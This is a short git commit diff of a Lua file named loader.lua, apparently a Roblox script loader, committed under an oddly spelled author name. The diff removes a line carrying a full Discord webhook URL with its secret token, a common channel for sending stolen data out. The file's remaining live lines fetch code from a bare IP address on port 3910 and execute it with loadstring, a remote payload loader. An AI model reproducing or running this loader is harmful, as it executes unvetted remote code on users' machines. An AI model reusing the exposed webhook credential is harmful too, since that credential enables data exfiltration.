1f018ccc0c37e2b043e146ce0e082854266178c3
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-30 15:23:25 +0500

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,3 +1,2 @@
-webhook:https://discord.com/api/webhooks/1397790219347951688/PRT3qndw5DX60AerR7V0R62LbgMJw8D06J-kxKyJ5YzXEfz7NVOBvR8MtvBT5-07Adqb
 ID="f6b11be0-66ce-47ba-9410-2d8f4435be1d";
 loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
